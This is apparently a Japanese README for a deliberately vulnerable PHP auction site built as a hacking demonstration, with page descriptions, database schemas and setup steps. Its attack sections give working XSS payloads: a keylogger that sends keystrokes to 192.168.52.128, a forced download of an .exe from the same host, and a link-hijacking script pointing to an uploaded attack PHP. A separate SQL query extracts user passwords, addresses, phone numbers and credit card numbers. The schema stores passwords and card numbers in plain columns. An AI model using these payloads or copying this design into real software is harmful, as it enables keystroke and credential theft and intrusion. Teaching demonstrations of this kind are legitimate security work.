## index.php
商品項目の表示、メインページ
## login.php
会員ログインページ
## logout.php
ログアウト可能なページ
## registst1.php
会員情報登録ステップ1ページ
## registst2.php
会員情報登録ステップ2ページ
## registst2.php
会員情報登録ステップ3ページ
## register_complete
会員情報登録完了ページ
## mypage.php
現時点で登録されている情報を表示するページ
## registchange.php
現時点で登録されている情報（ユーザー名以外）を変更できるページ
## itemdatails.php
アイテムの詳細情報を表示するページ?item001等で指定するとその情報を表示
## image_add.php
出品画面、商品名や初期価格、即決価格、カテゴリー、複数枚の画像をアップすることが出来る

## bid.php
入札処理php表示等なし。

## 使用したSQL文

```sql:User Table
CREATE TABLE `User`(
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`mail` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'メールアドレス',
	`password` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'パスワード',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:UserAdd Table
CREATE TABLE `UserAdd` (
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`address` VARCHAR(255) NOT NULL DEFAULT '' COMMENT '住所',
	`phone` VARCHAR(11) NOT NULL DEFAULT 0 COMMENT '電話番号',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb3;
```

```sql:User_Credit Table
CREATE TABLE `User_Credit` (
    `user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
    `credit` VARCHAR(16) DEFAULT NULL COMMENT 'クレジット番号'
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:Item Table
CREATE TABLE `Item` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `item_name`  TEXT COMMENT 'アイテム名',
    `item_price` INT(7) NOT NULL DEFAULT 0 COMMENT '金額',
    `max_price` INT(7) NOT NULL DEFAULT 0 COMMENT '最高金額',
    `buy_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '入札者',
    `item_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '出品者ID',
    `is_sold` TINYINT(1) NOT NULL DEFAULT 0 COMMENT '売れたか売れてないかのフラグ',
    `category` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'カテゴリー', -- ここにカテゴリーを追加
    PRIMARY KEY (`item_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

```sql:Item_Image Table
CREATE TABLE `Item_Image` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `image_path` VARCHAR(255) NOT NULL DEFAULT ''
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```

## アイテム情報表示のための仮sql登録文  
```sql:ItemInfo Regist
INSERT INTO `Item` (`item_id`, `item_name`, `item_price`, `max_price`, `item_user`)
VALUES
('item001', '商品A', 0,5000 ,'user001'),
('item002', '商品B', 0,10000 ,'user002'),
('item003', '商品C', 0, 15000,'user004'),
('item004', '商品D', 0, 20000,'user003');
```

```sql:Item_Image Regist
INSERT INTO `Item_Image` (`item_id`, `image_path`)
VALUES
('item001', './image/image1.png'),
('item001', './image/image2.png'),
('item002', './image/image3.png'),
('item003', './image/image4.png'),
('item004', './image/image5.png');
```

```sql:Item table 削除
drop table Item;
```


```sql:Item_Image table 削除
drop table Item_Image;
```
```sql:is_soldをすべて0に
UPDATE Item SET is_sold = 0;
```


## 攻撃コマンド一覧

```html:強制ダウンロード攻撃用コマンド（IPは各自のものに変更してください
aaa<script>        var link = document.createElement('a');        link.href = 'http://192.168.52.128/xss/sample.exe';        link.download = '';        document.body.appendChild(link);        link.click();    </script>

```



```html:キーロガー（IPは各自のものに変更してください
cc</div><script type="text/javascript">var keys='';document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;var obj = document.getElementById("div1");obj.innerText = keys;};window.setInterval(function(){new Image().src = 'http://192.168.52.128/keylogger.php?c='+keys;keys = '';}, 1000);</script><body><div id="div1"></div></body>
```
:::note info
phpを出品画面でアップして、
それぞれのリンク先を強制的にそのphpにすれば何かできるかも...？
:::

##XSS攻撃コマンド
```html:リダイレクト先変更
<script>document.addEventListener('DOMContentLoaded',function(){var e=document.querySelectorAll('.product-item');e.forEach(function(e){var t=e.querySelector('a');t&&(t.href='images/kogeki.php   ',console.log('リンクのhref属性を変更しました:',t.href))})});</script>
```


## ファイル情報ツリー
.  
├── bid.php  
├── database.php  
├── images  
├── img  
│   ├── bag_category.png  
│   ├── bike_category.png  
│   ├── clothes_category.png  
│   ├── logo_rectangle.png  
│   ├── logo_square.png  
│   └── watch_category.png  
├── index.php  
├── itemdetails.php  
├── login.php  
├── logout.php  
├── readme.md  
├── regist  
│   ├── image_add.php  
│   ├── mypage.php  
│   ├── registchange.php  
│   ├── register_complete.php  
│   ├── registst1.php  
│   ├── registst2.php  
│   └── registst3.php  
└── registst.css  

## オークションサイトセットアップ方法

1. php の設定を変更（デフォ設定だと、アップロードできるファイルが20ファイルまで,容量は2MBまでしかアップロードできません。）

```shell:php.iniファイル変更
sudo cp /etc/php/8.1/apache2/php.ini /etc/php/8.1/apache2/php.ini.bak
sudo gedit /etc/php/8.1/apache2/php.ini
```
設定ファイルの中で「**upload_max_filesize**」の値が「**2M**」となっているのを「**1G**」に変更//1回でアップロードできるファイル容量を**2MB**から**1GB**に変更

設定ファイルの中で「**post_max_size**」の値が「**2M**」となっているのを「**1G**」に変更//1回でアップロードできるファイル容量を**2MB**から**1GB**に変更

「**max_file_uploads**」の値が「**20**」となっているのを「**100**」に変更 //1回でアップロードできるファイル数が**20**から**100**に変更

```shell:apache再始動、ステータス確認
sudo systemctl restart apache2
sudo systemctl status apache2
```
ステータス見てActiveになっていればapacheが正常に動いている


githubからソースコードをダウンロードして、/var/www/html/auctionに配置
imagesの権限をwww-dataに対して書き込み権限を与える必要がある。


```shell:images権限変更
sudo chmod 757 /var/www/html/auction/images
```

2.データベース作成
mysqlからデータベース作成してもいいし、最新のプログラムをダウンロードした場合は
**/auction/createdatabase.php**を開いていただくことでデータベースの作成からテーブルの作成まですべてやってくれます



```shell:mysql起動
sudo mysql -u root -p
```

```sql:データベース作成
create database auction;
```
```sql:データベース切り替え
use auction;
```
```sql:テーブル一括作成
CREATE TABLE `User`(
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`mail` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'メールアドレス',
	`password` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'パスワード',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
CREATE TABLE `UserAdd` (
	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
	`address` VARCHAR(255) NOT NULL DEFAULT '' COMMENT '住所',
	`phone` VARCHAR(11) NOT NULL DEFAULT 0 COMMENT '電話番号',
	PRIMARY KEY (`user_id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8mb3;
CREATE TABLE `User_Credit` (
    `user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
    `credit` VARCHAR(16) DEFAULT NULL COMMENT 'クレジット番号'
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
CREATE TABLE `Item` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `item_name`  TEXT COMMENT 'アイテム名',
    `item_price` INT(7) NOT NULL DEFAULT 0 COMMENT '金額',
    `max_price` INT(7) NOT NULL DEFAULT 0 COMMENT '最高金額',
    `buy_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '入札者',
    `item_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '出品者ID',
    `is_sold` TINYINT(1) NOT NULL DEFAULT 0 COMMENT '売れたか売れてないかのフラグ',
    `category` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'カテゴリー', -- ここにカテゴリーを追加
    PRIMARY KEY (`item_id`)
    ) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
CREATE TABLE `Item_Image` (
    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
    `image_path` VARCHAR(255) NOT NULL DEFAULT ''
) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
```


3. ハッキング方法

## sqlインジェクション攻撃
**http://IPアドレス/auction/userview2.php**にアクセスし、下記sql文を入力する。
最初にユーザーで検索できますよって言って見せてから下記sql文を入力するのもありかも！

```sql:sqlinjec
SELECT Item.item_id, Item.item_name, Item.item_price, Item.max_price, Item.buy_user, Item.item_user, Item.is_sold, Item.category, User.user_id, User.mail, User.password, UserAdd.address, UserAdd.phone , User_Credit.credit FROM Item INNER JOIN User ON Item.item_user = User.user_id INNER JOIN UserAdd ON User.user_id = UserAdd.user_id INNER JOIN User_Credit ON User.user_id = User_Credit.user_id;
```

出品者の情報（電話番号、住所、クレジットカード番号、パスワード）等の情報が抜き取ることが出来ますよーって説明する感じでいいと思う


## XSS攻撃
XSS攻撃は**http://IPアドレス/auction/image_add.php**にアクセスをし、商品名の欄に以下の値を入力する

```js:xss
ジャケット0719<script>document.addEventListener('DOMContentLoaded',function(){var e=document.querySelectorAll('.product-item');e.forEach(function(e){var t=e.querySelector('a');t&&(t.href='images/kogeki.php   ',console.log('リンクのhref属性を変更しました:',t.href))})});</script>
```

初期価格と、即決価格、カテゴリーは適当な値でOK

ファイル選択欄でkogeki.phpをアップロードしてください。
**DLLink:https://github.com/onoyuki53/projectAuction/releases/download/xss/kogeki.php**  
右クリック→リンク先を保存などで出来ると思う。  
出品をクリックしたらトップページに戻って、先ほど出品した商品名（デフォルトだと「ジャケット0719」）をクリックしたら工科大爆破予告にすべて変わります！  


これ通りにやる必要は全然ないので、もっといい方法があったらそれで大丈夫！  
